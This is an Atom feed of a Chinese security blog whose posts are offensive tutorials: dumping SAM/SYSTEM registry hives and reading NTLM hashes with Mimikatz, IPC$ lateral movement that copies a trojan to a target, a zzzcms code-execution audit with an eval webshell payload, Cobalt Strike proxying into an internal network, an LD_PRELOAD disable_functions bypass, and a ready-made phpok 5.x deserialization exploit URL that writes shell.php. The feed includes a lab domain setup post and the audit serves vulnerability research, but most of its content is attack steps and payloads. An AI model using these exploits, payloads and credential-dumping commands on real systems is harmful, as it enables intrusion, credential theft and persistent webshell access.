<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-02T08:00:37.415Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</title>
    <link href="http://yoursite.com/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/"/>
    <id>http://yoursite.com/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/</id>
    <published>2020-02-02T07:39:51.000Z</published>
    <updated>2020-02-02T08:00:37.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/ntlm.png" alt><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/123456.png" alt></p><p>解不出来，尝试hash传递吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h1&gt;&lt;p&gt;已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和S
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>利用IPC进行横向渗透</title>
    <link href="http://yoursite.com/2020/02/01/%E5%88%A9%E7%94%A8IPC%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2020/02/01/利用IPC进行横向渗透/</id>
    <published>2020-02-01T11:07:34.000Z</published>
    <updated>2020-02-01T13:23:06.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IPC利用条件"><a href="#IPC利用条件" class="headerlink" title="IPC利用条件"></a>IPC利用条件</h1><p>服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。</p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>首先我们看当前IPC连接记录，这里的记录是空的，说明占时没有链接<br><img src="/2020/02/01/利用IPC进行横向渗透/1.png" alt></p><p>现在我们建立一个完整的连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/2.png" alt><br>这个时候我们再net view，发现成功建立连接<br><img src="/2020/02/01/利用IPC进行横向渗透/3.png" alt></p><p>然后可以将目标机器的磁盘映射出来，这里我把目标机器的C盘映射到了本机的F盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use F: \\127.0.0.1\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/4.png" alt><br><img src="/2020/02/01/利用IPC进行横向渗透/5.png" alt></p><p>查看下目标机器的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /s 192.168.43.100 /u username /p password</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/6.png" alt></p><p>利用copy命令将我们构造好的木马程序复制到目标机器上面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy ccc.exe \\192.168.43.100\C$</span><br><span class="line"></span><br><span class="line">dir \\192.168.43.100\C&amp;</span><br></pre></td></tr></table></figure></p><p>然后怎么玩就看思路了</p><p>这个ipc的利用前提也是要有目标服务器的账号密码或者账号为空的情况下才能进去，有了账号密码可以直接3389了吧，哈哈哈</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;IPC利用条件&quot;&gt;&lt;a href=&quot;#IPC利用条件&quot; class=&quot;headerlink&quot; title=&quot;IPC利用条件&quot;&gt;&lt;/a&gt;IPC利用条件&lt;/h1&gt;&lt;p&gt;服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。&lt;/
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>简单的域环境搭建</title>
    <link href="http://yoursite.com/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2020/01/31/简单的域环境搭建/</id>
    <published>2020-01-31T14:16:55.000Z</published>
    <updated>2020-01-31T15:57:26.800Z</updated>
    
    <content type="html"><![CDATA[<p>环境</p><ul><li>Windows server 2012(DC)</li><li>Windows server 2008</li><li>Windows7</li></ul><h1 id="配置DC服务器"><a href="#配置DC服务器" class="headerlink" title="配置DC服务器"></a>配置DC服务器</h1><p>这里用windows server 2012作为域控服务器，首先我们修改网络，这里我们自定义ip，并将DNS设为2012本机(一般域控也作为DNS服务器)<br><img src="/2020/01/31/简单的域环境搭建/network12.png" alt></p><p>然后我们在服务器管理里面，点击 <strong>添加角色和功能</strong><br><img src="/2020/01/31/简单的域环境搭建/121.png" alt></p><p>第一页是导向，我们不管点击下一步。</p><p>安装类型我们就选择默认的就好。<br><img src="/2020/01/31/简单的域环境搭建/122.png" alt></p><p>服务器选择，我们这里占时就一台服务器，我们点击下一步就好<br><img src="/2020/01/31/简单的域环境搭建/123.png" alt></p><p>服务器角色，我们选择安装 <strong>Active Directory域服务</strong> 和 <strong>DNS服务器</strong><br><img src="/2020/01/31/简单的域环境搭建/124.png" alt></p><p>后面的步骤就一路默认就行，最后点击安装。<br><img src="/2020/01/31/简单的域环境搭建/126.png" alt><br><img src="/2020/01/31/简单的域环境搭建/127.png" alt></p><p>这里安装完毕之后，在服务器管理器的页面中点击右上方的小黄旗，然后我们要将这台服务器提升为域控服务器<br><img src="/2020/01/31/简单的域环境搭建/128.png" alt></p><p>点击之后 部署配置这里我们操作为 <strong>添加新林</strong>，然后我们要设置根域名，也就是域名，这里设置成 <strong>hacke.testlab</strong><br><img src="/2020/01/31/简单的域环境搭建/1210.png" alt></p><p>域控制器选项这里填写好密码，后面的操作默认就好。</p><p>上面所有的步骤进行完了之后，重启，然后命令行下输入net view，出现了错误<br><img src="/2020/01/31/简单的域环境搭建/error.png" alt></p><p>解决方式：将Computer Browser服务启动就行<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><p>我们这里再输入命令，当我们看到HACKE这个域的时候，就说明已经配置ok了<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><h1 id="配置域内其他服务器"><a href="#配置域内其他服务器" class="headerlink" title="配置域内其他服务器"></a>配置域内其他服务器</h1><p>这里我用08举例子<br><img src="/2020/01/31/简单的域环境搭建/08.png" alt></p><p>ip设为固定ip，DNS指向我们的域控服务器。</p><p>计算机名我们自行修改，然后下方选择加入的域(这里会要认证域管理权限的账号)</p><p>然后关闭域网络中的防火墙</p><p>所有配置好之后，cmd下运行<br><img src="/2020/01/31/简单的域环境搭建/07.png" alt></p><p>这里就能看见，这个hacke域下所有的机器了</p><p>当你运行命令之后回显成这样，就说明域环境配置成功啦</p><h1 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">#查看局域网内的域控</span><br><span class="line"></span><br><span class="line">net view /domain:domainname</span><br><span class="line">#查看domainname域中的主机</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows server 2012(DC)&lt;/li&gt;
&lt;li&gt;Windows server 2008&lt;/li&gt;
&lt;li&gt;Windows7&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;配置DC服务器&quot;&gt;&lt;a href=&quot;#配置DC服务器&quot; cla
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>再谈zzzcms高危漏洞，你也能审计出来的代码执行</title>
    <link href="http://yoursite.com/2020/01/08/%E5%86%8D%E8%B0%88zzzcms%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E4%BD%A0%E4%B9%9F%E8%83%BD%E5%AE%A1%E8%AE%A1%E5%87%BA%E6%9D%A5%E7%9A%84%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/</id>
    <published>2020-01-08T07:03:46.000Z</published>
    <updated>2020-01-13T04:46:54.240Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发公众号：[信安之路]<br>zzzcms的后台模板处的命令执行可以说是这套CMS比较典型的漏洞了，很久之前自己跟踪过一遍漏洞代码，最近又拿起来玩了玩，发现自己也能够审计到这个漏洞点，整个漏洞审计的过程也很简单，没有啥骚操作。</p><p><strong>下面我就会按照审计的思路，而并非漏洞分析的思路，给大家说说我是如何通过自己的努力审计出这个命令执行漏洞的</strong><br><a id="more"></a></p><p>cms下载地址：<a href="https://yunpan.360.cn/surl_ycSTDKgjnKt" target="_blank" rel="noopener">https://yunpan.360.cn/surl_ycSTDKgjnKt</a><br>这里我下载的是V1.6.1</p><h1 id="定位漏洞点"><a href="#定位漏洞点" class="headerlink" title="定位漏洞点"></a>定位漏洞点</h1><p>审计的时候我是直接全局搜索敏感函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php代码执行函数：</span><br><span class="line">eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</span><br></pre></td></tr></table></figure></p><p>首先看下eval，全局搜索<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/eval.png" alt><br>仔细翻翻看，存在eval函数的php文件就只有这一个zzz_template.php，而我们的这个命令执行的漏洞点也就是存在这里。(惊不惊喜，发现漏洞点其实就是这么简单)</p><p>跟踪到了 <strong>/inc/zzz_template.php</strong> 中的 <strong>parserIfLabel</strong> 函数<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/eval2.png" alt><br>有嫌疑的点我们找到了，接下来我们仔细看看这个函数</p><h1 id="细看漏洞函数"><a href="#细看漏洞函数" class="headerlink" title="细看漏洞函数"></a>细看漏洞函数</h1><p>来看一下这个函数的逻辑<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/eval3.png" alt><br>无敌，看起来并没有啥过滤，我们本地将这个函数弄出来测试一下<br>这里将我们$zcontent的值构造一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$zcontent = &apos;&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125;&apos;;</span><br><span class="line">parserIfLabel( $zcontent );</span><br><span class="line"></span><br><span class="line">function parserIfLabel( $zcontent ) &#123;</span><br><span class="line">$pattern = &apos;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&apos;;</span><br><span class="line">if ( preg_match_all( $pattern, $zcontent, $matches ) ) &#123;</span><br><span class="line">$count = count( $matches[ 0 ] );</span><br><span class="line">for ( $i = 0; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">$flag = &apos;&apos;;</span><br><span class="line">$out_html = &apos;&apos;;</span><br><span class="line">$ifstr = $matches[ 1 ][ $i ];</span><br><span class="line">$ifstr = str_replace( &apos;&lt;&gt;&apos;, &apos;!=&apos;, $ifstr );</span><br><span class="line">$ifstr = str_replace( &apos;mod&apos;, &apos;%&apos;, $ifstr );</span><br><span class="line">$ifstr1 = cleft( $ifstr, 0, 1 );</span><br><span class="line">switch ( $ifstr1 ) &#123;</span><br><span class="line">case &apos;=&apos;:</span><br><span class="line">$ifstr = &apos;0&apos; . $ifstr;</span><br><span class="line">break;</span><br><span class="line">case &apos;&#123;&apos;:</span><br><span class="line">case &apos;[&apos;:</span><br><span class="line">$ifstr = &quot;&apos;&quot; . str_replace( &quot;=&quot;, &quot;&apos;=&quot;, $ifstr );</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">$ifstr = str_replace( &apos;=&apos;, &apos;==&apos;, $ifstr );</span><br><span class="line">$ifstr = str_replace( &apos;===&apos;, &apos;==&apos;, $ifstr );</span><br><span class="line">@eval( &apos;if(&apos; . $ifstr . &apos;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&apos; );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function cleft( $str, $start = 0, $num = 1 ) &#123;</span><br><span class="line">$var = trim( $str );</span><br><span class="line">$result = substr( $var, $start, $num );</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问:<a href="http://127.0.0.1/test.php" target="_blank" rel="noopener">http://127.0.0.1/test.php</a><br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/phpinfo.png" alt><br>成功执行命令了，这个函数存在命令执行漏洞！</p><h1 id="如何调用漏洞函数"><a href="#如何调用漏洞函数" class="headerlink" title="如何调用漏洞函数"></a>如何调用漏洞函数</h1><p>这里又出现了一个问题，漏洞函数找到了，如何去调用这一个函数呢？</p><p>在审计的时候我一般会有两种思路：<br>1、特定的功能点调用漏洞函数，我们寻找功能点<br>2、可以直接url调用漏洞函数，构造url触发漏洞</p><p>大家可以自行尝试一下这两种思路。</p><p>那么这里是哪种呢，往下看，我们看看zzz_template.php的整体架构。</p><p><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/ParserTemplate.png" alt><br>原来我们这里的 <strong>parserIfLabel</strong> 函数是在 <strong>ParserTemplate</strong> 类中的，而且这个类中的 <strong>parserCommom</strong> 也会调用这个函数。</p><p>那么想触发我们的漏洞函数，首先必须要生成 <strong>ParserTemplate</strong> 这个类。</p><p>全局搜索<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/ParserTemplate2.png" alt></p><p>这里在两个文件中出现了 <strong>ParserTemplate</strong> 类，一个是/admin123/save.php，另外一个是zzz_client.php，不喜欢看后台我就直接看了下zzz_client.php。</p><p>zzz_client.php中匹配到了多次，我们一个一个来看</p><h1 id="第一个匹配点，利用失败"><a href="#第一个匹配点，利用失败" class="headerlink" title="第一个匹配点，利用失败"></a>第一个匹配点，利用失败</h1><p><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/diyichu.png" alt></p><p>注意上面的if条件：<strong>$location==’user’</strong></p><p>我们继续跟踪 <strong>$location</strong> 这个变量，来到了line23<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/location.png" alt></p><p>跟踪 <strong>getlocation()</strong> 这个函数<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/location2.png" alt></p><p>其实下面还有一大段代码没有截出来，但是没有关系，我们只需要用get请求location参数，举个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们构造url:</span><br><span class="line">http://127.0.0.1/zzzphpV1.6.1/?location=user</span><br><span class="line">那么我们的参数:</span><br><span class="line">$location=user</span><br></pre></td></tr></table></figure></p><p>这样就能满足我们的条件了，继续看if里面的内容，我这里继续贴出关键的代码：<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/sssss.png" alt></p><p>这里的 <strong>TPL_DIR</strong> 的值为 <strong>\template\pc\cn2016\html\</strong>，怎么构造的可以自己跟踪一下</p><p>整个流程我简化出来了，要是我们可以将我们的$zcontent修改成我们构造好的内容，那岂不是就能够触发了。</p><p>所以这个点我们要修改 <strong>\template\pc\cn2016\html\userlogin.html</strong> 中的内容，这里后台给我们提供了这样的功能。<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/模板.png" alt></p><p>但是我们发现 <strong>html</strong> 文件夹下并不存在<strong>userlogin.html</strong>，尴尬了，又不能自己新建一个。</p><p>看来 location为user这条路走不通，继续看下一个。</p><h1 id="第N个匹配点，利用成功"><a href="#第N个匹配点，利用成功" class="headerlink" title="第N个匹配点，利用成功"></a>第N个匹配点，利用成功</h1><p>失败乃成功之母，在我跟踪了N次之后，终于找到了可以利用的一个点(大家可以自行尝试一下)</p><p>其实也就是第三个匹配的点，前两个用的有点鸡肋。<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/fuckuser.png" alt><br>当我们的 $location=search/form/screen/app的时候进入下一步。<br>html文件下并不存在 form/screen/app.html，这里只能利用search了呀。</p><p>于是乎我访问了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zzzphpV1.6.1/?location=serach</span><br></pre></td></tr></table></figure></p><p>并没有跳转到search的页面，而是给我返回到了主页，按道理来说应该是能行的啊，后来发现问题在getlocation这个函数里面的checklocation函数<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/checklocation.png" alt></p><p>search并不在这几个列表里面，那要想办法继续搞啊，于是我继续细看了getlocation函数，发现一个有意思的地方<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/LL.png" alt></p><p>要是search自定义了LOCATION就好了，全局搜索这个LOCATION<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/define.png" alt></p><p>嘿嘿，正好search中定义了这个值，在 <strong>search\index.php</strong> 中，这不就刚好吗，我去修改了 html下的search.html<br><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/success1.png" alt></p><p>然后访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zzzphpV1.6.1/search/index.php</span><br></pre></td></tr></table></figure></p><p><img src="/2020/01/08/再谈zzzcms代码执行，你也能审计出来的高危漏洞/success2.png" alt></p><p>成功执行phpinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo_payload:&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125;</span><br><span class="line">一句话_payload:&#123;if:&lt;?php eval($_POST[sss]) ?&gt;&#125;phpinfo();&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>还有没有其他可以利用的点就靠大家自行去挖掘了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>自身的审计能力和漏洞复现跟踪代码完全是两码事，复现看懂了漏洞成因你不一定能够审计的出来，自身的审计能力也需要经过大量的思考才会有所提升，希望大家都能够静下心来看会代码，漏洞就在那里，看你是否主动去寻找到它了，希望这篇文章能对你有所帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发公众号：[信安之路]&lt;br&gt;zzzcms的后台模板处的命令执行可以说是这套CMS比较典型的漏洞了，很久之前自己跟踪过一遍漏洞代码，最近又拿起来玩了玩，发现自己也能够审计到这个漏洞点，整个漏洞审计的过程也很简单，没有啥骚操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下面我就会按照审计的思路，而并非漏洞分析的思路，给大家说说我是如何通过自己的努力审计出这个命令执行漏洞的&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用cs+proxifier代理内网流量</title>
    <link href="http://yoursite.com/2019/12/30/%E5%88%A9%E7%94%A8cs-proxifier%E4%BB%A3%E7%90%86%E5%86%85%E7%BD%91%E6%B5%81%E9%87%8F/"/>
    <id>http://yoursite.com/2019/12/30/利用cs-proxifier代理内网流量/</id>
    <published>2019-12-30T09:25:13.000Z</published>
    <updated>2020-01-13T04:46:59.615Z</updated>
    
    <content type="html"><![CDATA[<p>背景：拿到一台windows主机，cs上线，下一步打开3389，这个时候需要将目标内的网络代理出来。<br><a id="more"></a><br><img src="/2019/12/30/利用cs-proxifier代理内网流量/cs.png" alt><br>这里上线了主机，首先设置socks<br><img src="/2019/12/30/利用cs-proxifier代理内网流量/socks.png" alt><br>我们这里将socks的端口设置为8888</p><p>打开proxifier，配置文件–&gt;代理服务器–&gt;添加，输入你服务器的ip和端口<br><img src="/2019/12/30/利用cs-proxifier代理内网流量/sock4.png" alt></p><p>接下来设置我们需要代理的软件，配置文件–&gt;代理规则<br><img src="/2019/12/30/利用cs-proxifier代理内网流量/mstsc.png" alt></p><p>然后打开mstsc，输入我们目标的内网地址</p><p>输入我们用mimikatz抓下来的密码就可以登录了<br><img src="/2019/12/30/利用cs-proxifier代理内网流量/10.png" alt><br><img src="/2019/12/30/利用cs-proxifier代理内网流量/success.png" alt><br>是不是很简单</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;背景：拿到一台windows主机，cs上线，下一步打开3389，这个时候需要将目标内的网络代理出来。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>利用LD_PRELOAD绕过php中的disable_function</title>
    <link href="http://yoursite.com/2019/12/25/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%BB%95%E8%BF%87php%E4%B8%AD%E7%9A%84disable-function/"/>
    <id>http://yoursite.com/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/</id>
    <published>2019-12-25T08:59:01.000Z</published>
    <updated>2020-01-13T04:47:04.958Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式<br>利用前提：没有禁用putenv函数<br><a id="more"></a></p><h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>下载地址在这里，然后要上传一个php文件和一个用c编译出来的so文件<br>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c  -m32 -o bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure></p><p><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/success.png" alt></p><h1 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h1><p>蚁剑这里直接写了个插件利用<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/ant.png" alt></p><p>选择LD_PRELOAD模式<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/putenv.png" alt></p><p>点击开始<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/upload.png" alt><br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/antproxy.png" alt><br>会在当前目录下生成一个antproxy.php的文件，然后我们连上这个文件就可以发现可以执行命令啦~<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/shell.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式&lt;br&gt;利用前提：没有禁用putenv函数&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="disable_function" scheme="http://yoursite.com/tags/disable-function/"/>
    
  </entry>
  
  <entry>
    <title>phpok5.x 反序列化漏洞</title>
    <link href="http://yoursite.com/2019/12/11/phpok5-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/12/11/phpok5-x-反序列化漏洞/</id>
    <published>2019-12-11T10:32:30.000Z</published>
    <updated>2020-01-13T05:02:48.303Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p><p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p><p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>lazy…….</p>]]></content>
    
    <summary type="html">
    
